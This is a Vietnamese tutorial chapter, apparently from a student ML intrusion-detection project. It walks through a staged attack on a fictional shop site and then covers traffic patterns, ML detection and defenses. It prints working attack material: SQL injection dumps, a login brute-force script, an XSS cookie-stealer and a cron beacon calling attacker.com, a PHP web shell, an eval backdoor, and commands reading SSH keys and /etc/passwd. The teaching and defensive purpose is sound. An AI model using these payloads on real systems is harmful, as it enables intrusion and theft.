# Cách một Website bị tấn công

## Kịch bản thực tế: Attack trên một E-commerce Website

Hãy tưởng tượng một website bán hàng online: **ShopVN.com**

### Kiến trúc hệ thống
```
                    Internet
                       │
                       ▼
                 ┌─────────┐
                 │ Firewall │
                 └────┬─────┘
                      │
          ┌───────────┴──────────┐
          ▼                      ▼
    ┌──────────┐          ┌──────────┐
    │ Web      │          │ API      │
    │ Server   │◄────────►│ Server   │
    │ (Nginx)  │          │ (FastAPI)│
    └────┬─────┘          └────┬─────┘
         │                     │
         └──────────┬──────────┘
                    ▼
              ┌──────────┐
              │ Database │
              │ (MySQL)  │
              └──────────┘
```

---

## Phase 1: Reconnaissance (Thăm dò)

### Bước 1: Information Gathering

**Attacker bắt đầu thu thập thông tin:**

```bash
# 1. WHOIS Lookup
whois shopvn.com
# → Tìm: Domain registrar, name servers, admin contacts

# 2. DNS Enumeration
nslookup shopvn.com
dig shopvn.com ANY
# → Tìm: IP addresses, subdomains

# 3. Subdomain Discovery
subfinder -d shopvn.com
# Results:
# - www.shopvn.com
# - api.shopvn.com
# - admin.shopvn.com  ← Interesting!
# - dev.shopvn.com    ← Development server!
```

**Kết quả:**
- Main IP: 103.x.x.x
- Admin panel: admin.shopvn.com
- API endpoint: api.shopvn.com
- **Dev server exposed!**: dev.shopvn.com (có thể có security yếu hơn)

### Bước 2: Technology Stack Detection

```bash
# Whatweb
whatweb shopvn.com

# Wappalyzer (browser extension)
# hoặc kiểm tra HTTP headers
curl -I https://shopvn.com
```

**Phát hiện:**
```
Server: nginx/1.18.0
X-Powered-By: PHP/7.4.3
Framework: Laravel 8.x
Database: MySQL (leaked in error messages)
Frontend: jQuery 3.5.1, Bootstrap 4
```

### Bước 3: Port Scanning

```bash
# Nmap full port scan
nmap -p- -sV -A shopvn.com

# Results:
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1
80/tcp   open  http       nginx 1.18.0
443/tcp  open  https      nginx 1.18.0
3306/tcp open  mysql      MySQL 5.7.33  ← EXPOSED!
8080/tcp open  http-proxy ← Debug panel?
```

**Red flags:**
- Port 3306 (MySQL) mở ra internet! (Nên chỉ internal)
- Port 8080 có gì đó?

### Bước 4: Directory Brute-forcing

```bash
# Gobuster
gobuster dir -u https://shopvn.com -w /usr/share/wordlists/dirb/common.txt

# Found:
/admin          → 302 Redirect to /admin/login
/api            → 200 OK
/backup         → 403 Forbidden (nhưng tồn tại!)
/config.php.bak → 200 OK  ← DANGEROUS!
/.git           → 200 OK  ← VERY DANGEROUS!
/phpinfo.php    → 200 OK  ← Info leak
```

**Critical findings:**
1. `config.php.bak` - Có thể chứa database credentials
2. `.git` folder exposed - Có thể download source code!
3. `phpinfo.php` - Leak thông tin hệ thống

### Bước 5: Download Source Code

```bash
# GitDumper
gitdumper https://shopvn.com/.git source-code/

# Now attacker has full source code!
# Can read:
# - Database credentials
# - API keys
# - Business logic
# - Vulnerabilities in code
```

**Trong source code tìm thấy:**
```php
// config.php
$db_host = "localhost";
$db_user = "shopvn_admin";
$db_pass = "ShopVN@2023!";  // Weak password!
$db_name = "shopvn_db";

// API key
$stripe_secret_key = "sk_live_xxxxxxxxxxxx";
```

---

## Phase 2: Vulnerability Analysis

### Lỗ hổng #1: SQL Injection

**Tìm thấy trong source code:**
```php
// search.php (Vulnerable)
$keyword = $_GET['q'];
$query = "SELECT * FROM products WHERE name LIKE '%$keyword%'";
$result = mysqli_query($conn, $query);
```

**Test SQL Injection:**
```
# Normal request:
https://shopvn.com/search?q=laptop

# Test payload:
https://shopvn.com/search?q=laptop' OR '1'='1

# SQL becomes:
SELECT * FROM products WHERE name LIKE '%laptop' OR '1'='1%'
# → Returns all products!

# Confirm vulnerability:
https://shopvn.com/search?q=laptop' AND 1=1 --   → Works
https://shopvn.com/search?q=laptop' AND 1=2 --   → Different result
# ✓ Confirmed SQL Injection!
```

### Lỗ hổng #2: Weak Authentication

**Admin panel brute-force:**
```python
import requests

url = "https://shopvn.com/admin/login"
usernames = ["admin", "administrator", "root", "shopvn"]
passwords = ["admin", "password", "123456", "ShopVN@2023!"]

for user in usernames:
    for pwd in passwords:
        data = {"username": user, "password": pwd}
        r = requests.post(url, data=data)
        if "Invalid" not in r.text:
            print(f"[+] Found: {user}:{pwd}")
            break
```

**Kết quả:**
- Username: `admin`
- Password: `admin123` (từ leaked config file)

### Lỗ hổng #3: Insecure Direct Object Reference (IDOR)

**Normal user request:**
```
GET /api/orders/12345
Cookie: session=user_token_abc

Response:
{
  "order_id": 12345,
  "user_id": 1001,
  "total": 500000,
  "items": [...]
}
```

**Attack (change order_id):**
```
GET /api/orders/12346  ← Other user's order

Response:
{
  "order_id": 12346,
  "user_id": 1002,  ← Different user!
  "total": 2000000,
  "items": [...]
}
# → Can access other users' orders!
```

### Lỗ hổng #4: XSS in Product Reviews

**Vulnerable code:**
```php
// Display reviews
<?php foreach($reviews as $review): ?>
    <div class="review">
        <p><?php echo $review['comment']; ?></p>
    </div>
<?php endforeach; ?>
```

**Attack:**
```html
<!-- Attacker submits review: -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- When other users view this review → Cookie stolen! -->
```

---

## Phase 3: Exploitation

### Attack #1: SQL Injection để lấy data

**Dump database:**
```sql
-- Find number of columns
' UNION SELECT NULL,NULL,NULL --

-- Find table names
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='shopvn_db' --

-- Results:
-- users
-- products
-- orders
-- admin_users

-- Dump admin credentials
' UNION SELECT username,password,email FROM admin_users --

-- Results:
admin | $2y$10$abcd1234... (bcrypt hash) | admin@shopvn.com
```

**Crack password hash:**
```bash
hashcat -m 3200 hash.txt rockyou.txt
# Cracked: admin123
```

### Attack #2: Upload Web Shell

**Sau khi login admin panel, tìm upload function:**

```html
<!-- Upload product image -->
<form action="/admin/upload" method="POST" enctype="multipart/form-data">
    <input type="file" name="image">
    <button>Upload</button>
</form>
```

**Vulnerable code:**
```php
// upload.php
$filename = $_FILES['image']['name'];
$target = "uploads/" . $filename;
move_uploaded_file($_FILES['image']['tmp_name'], $target);
// → No file type validation!
```

**Upload PHP web shell:**
```php
// shell.php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**Access web shell:**
```
https://shopvn.com/uploads/shell.php?cmd=whoami
→ www-data

https://shopvn.com/uploads/shell.php?cmd=ls -la /var/www
→ List files

https://shopvn.com/uploads/shell.php?cmd=cat /etc/passwd
→ Dump users
```

### Attack #3: Database Access từ Exposed MySQL Port

**Connect directly to MySQL:**
```bash
mysql -h shopvn.com -u shopvn_admin -p'ShopVN@2023!'

# Once connected:
USE shopvn_db;
SHOW TABLES;

SELECT * FROM users LIMIT 10;
# → Get all user emails, hashed passwords

SELECT * FROM orders WHERE total > 10000000;
# → Find high-value orders

-- Modify data
UPDATE products SET price = 1 WHERE id = 999;
-- → Make product cost 1 VND!

-- Create admin user
INSERT INTO admin_users (username, password) VALUES ('hacker', '$2y$10$...');
```

---

## Phase 4: Post-Exploitation

### Maintain Access (Persistence)

**1. Create backdoor account:**
```sql
INSERT INTO admin_users (username, password, email)
VALUES ('system_backup', '$2y$10$hashedpass', 'backup@localhost');
```

**2. Inject backdoor in source code:**
```php
// Add to index.php
if($_GET['backdoor'] == 'secret_key_12345') {
    eval($_GET['cmd']);
}
```

**3. Scheduled task:**
```bash
# Via web shell
echo "* * * * * curl https://attacker.com/beacon?host=shopvn" > /tmp/cron
crontab /tmp/cron
# → Server pings attacker every minute
```

### Data Exfiltration

**Dump entire database:**
```bash
mysqldump -h shopvn.com -u shopvn_admin -p'ShopVN@2023!' shopvn_db > dump.sql

# dump.sql contains:
# - 50,000 user records (emails, passwords)
# - 10,000 order records (personal info, addresses)
# - Payment information
```

**Steal files:**
```bash
# Via web shell
tar -czf /tmp/backup.tar.gz /var/www/shopvn
# Download via:
https://shopvn.com/uploads/shell.php?cmd=cp /tmp/backup.tar.gz /var/www/shopvn/uploads/
```

### Pivot to Internal Network

**After getting shell, scan internal network:**
```bash
# Find other servers
nmap -sn 192.168.1.0/24

# Results:
192.168.1.10 - Database Server
192.168.1.20 - File Server
192.168.1.30 - Admin Workstation
```

**SSH to database server (keys might be on web server):**
```bash
cat ~/.ssh/id_rsa
# Copy private key → SSH to 192.168.1.10
```

---

## Traffic Patterns: Normal vs Attack

### Normal User Traffic

```
Time    | Source IP     | Dest Port | Request                    | Response
--------|---------------|-----------|----------------------------|----------
10:00:01| 14.x.x.x     | 443       | GET /                      | 200
10:00:02| 14.x.x.x     | 443       | GET /products              | 200
10:00:05| 14.x.x.x     | 443       | GET /products/laptop-dell  | 200
10:00:10| 14.x.x.x     | 443       | POST /cart/add             | 200
10:00:15| 14.x.x.x     | 443       | GET /checkout              | 200
10:00:20| 14.x.x.x     | 443       | POST /order/create         | 200

# Characteristics:
- Normal browsing pattern
- Reasonable intervals (1-5 seconds)
- Sequential page flow
- Single IP
```

### Attack Traffic

#### Probe Attack (Port Scan)
```
Time    | Source IP     | Dest Port | Request           | Response
--------|---------------|-----------|-------------------|----------
10:00:01| 45.x.x.x     | 21        | SYN               | RST (closed)
10:00:01| 45.x.x.x     | 22        | SYN               | SYN-ACK (open)
10:00:01| 45.x.x.x     | 23        | SYN               | RST (closed)
10:00:01| 45.x.x.x     | 25        | SYN               | RST (closed)
...
10:00:05| 45.x.x.x     | 3306      | SYN               | SYN-ACK (open!)
10:00:05| 45.x.x.x     | 8080      | SYN               | SYN-ACK (open)

# Characteristics:
- Sequential port scanning
- Very fast (milliseconds apart)
- No data transfer
- Single source IP
```

#### Brute Force Attack (R2L)
```
Time    | Source IP     | Request                              | Response
--------|---------------|--------------------------------------|----------
10:00:01| 185.x.x.x    | POST /admin/login user=admin pwd=123 | 401
10:00:01| 185.x.x.x    | POST /admin/login user=admin pwd=pass| 401
10:00:02| 185.x.x.x    | POST /admin/login user=admin pwd=adm | 401
10:00:02| 185.x.x.x    | POST /admin/login user=admin pwd=root| 401
...
10:00:30| 185.x.x.x    | POST /admin/login user=admin pwd=adm123| 200 ✓

# Characteristics:
- Repeated login attempts
- Same username, different passwords
- Fast succession
- High 401 error rate
```

#### SQL Injection Attack (R2L)
```
Time    | Request                                        | Pattern
--------|------------------------------------------------|------------------
10:00:01| GET /search?q=laptop' OR '1'='1                | SQL syntax
10:00:02| GET /search?q=laptop' UNION SELECT NULL --     | UNION attack
10:00:03| GET /search?q=laptop' UNION SELECT user,pass FROM users -- | Data extraction
10:00:04| GET /search?q=laptop'; DROP TABLE products --  | Destructive

# Characteristics:
- SQL keywords in parameters (OR, UNION, SELECT, DROP)
- Quote characters (', ")
- Comment sequences (-- , /**/)
- Unusual URL encoding
```

#### DoS Attack
```
Time    | Source IPs         | Dest Port | Request        | Count
--------|-------------------|-----------|----------------|-------
10:00:01| 100+ different IPs| 443       | SYN            | 5000/sec
10:00:02| 100+ different IPs| 443       | SYN            | 8000/sec
10:00:03| 100+ different IPs| 443       | SYN            | 12000/sec

# Characteristics:
- Massive request volume
- Multiple source IPs (DDoS)
- Half-open connections
- Server CPU/memory spike
```

---

## ML Model Detection

### Feature Extraction từ Traffic

```python
# Features extracted per connection:
features = {
    'duration': 5.2,                    # Connection duration (seconds)
    'protocol_type': 'tcp',             # tcp, udp, icmp
    'service': 'http',                  # http, ftp, ssh, etc.
    'flag': 'SF',                       # SYN-FIN, REJ, etc.
    'src_bytes': 1024,                  # Bytes sent from source
    'dst_bytes': 4096,                  # Bytes received
    'wrong_fragment': 0,                # Fragmented packets
    'urgent': 0,                        # Urgent packets
    'count': 10,                        # Connections to same host (last 2s)
    'srv_count': 15,                    # Connections to same service
    'serror_rate': 0.0,                 # SYN error rate
    'rerror_rate': 0.0,                 # REJ error rate
    'same_srv_rate': 0.8,               # % same service
    'diff_srv_rate': 0.2,               # % different services
    'dst_host_count': 255,              # Connections to destination host
    'dst_host_srv_count': 200,          # Same service to dest host
    'dst_host_same_src_port_rate': 0.1, # % same source port
    # ... 41 features total
}
```

### Model Predictions

#### Normal Traffic
```python
features = extract_features(connection)
# {duration: 5, protocol: 'tcp', service: 'http', count: 2, ...}

prediction = model.predict([features])
# Output: [0]  → Normal

probabilities = model.predict_proba([features])
# Output: [[0.95, 0.02, 0.02, 0.01, 0.00]]
#          Normal  DoS   Probe  R2L   U2R
```

#### DoS Attack
```python
features = {
    'duration': 0.1,           # Very short
    'count': 500,              # Many connections!
    'srv_count': 500,
    'serror_rate': 0.9,        # High error rate!
    'same_srv_rate': 1.0,
    'dst_host_count': 255,     # Max connections!
}

prediction = model.predict([features])
# Output: [1]  → DoS

probabilities = model.predict_proba([features])
# Output: [[0.01, 0.94, 0.03, 0.01, 0.01]]
#          Normal  DoS   Probe  R2L   U2R
#                  ^^^ High confidence!
```

#### Port Scan (Probe)
```python
features = {
    'duration': 0.0,           # No data transfer
    'src_bytes': 0,
    'dst_bytes': 0,
    'count': 100,              # Many attempts
    'diff_srv_rate': 1.0,      # All different services!
    'dst_host_diff_srv_rate': 1.0,
    'serror_rate': 0.5,        # Many rejections
}

prediction = model.predict([features])
# Output: [2]  → Probe
```

---

## Defense Mechanisms

### 1. Web Application Firewall (WAF)
```
Request: GET /search?q=laptop' OR '1'='1
    ↓
WAF detects SQL injection pattern
    ↓
Block request → Return 403 Forbidden
    ↓
Log to SIEM
```

### 2. Rate Limiting
```python
# Login attempts per IP
if get_attempts(ip_address) > 5:
    return "Too many requests. Try again in 15 minutes."
```

### 3. ML-based IDS (Our project!)
```
Network Traffic → Feature Extraction → ML Model → Alert
```

### 4. Intrusion Prevention System (IPS)
```
Detect attack → Automatically block IP → Alert admin
```

---

## Summary: Attack Kill Chain

```
1. Reconnaissance
   └─ Gather info, find subdomains, scan ports
      └─ ML Detection: Probe attack (many connection attempts)

2. Weaponization
   └─ Prepare exploit (SQL injection, XSS payload)
      └─ ML Detection: Unusual request patterns

3. Delivery
   └─ Send exploit via web request
      └─ ML Detection: Malicious patterns in HTTP

4. Exploitation
   └─ Execute SQL injection, upload shell
      └─ ML Detection: R2L attack (unauthorized access)

5. Installation
   └─ Install backdoor, create admin account
      └─ ML Detection: U2R attack (privilege escalation)

6. Command & Control
   └─ Maintain access, communicate with attacker server
      └─ ML Detection: Abnormal outbound connections

7. Actions on Objectives
   └─ Steal data, modify database, launch further attacks
      └─ ML Detection: Data exfiltration patterns
```

---

**Next**: [04 - ML Model Architecture](04-ml-model-architecture.md)
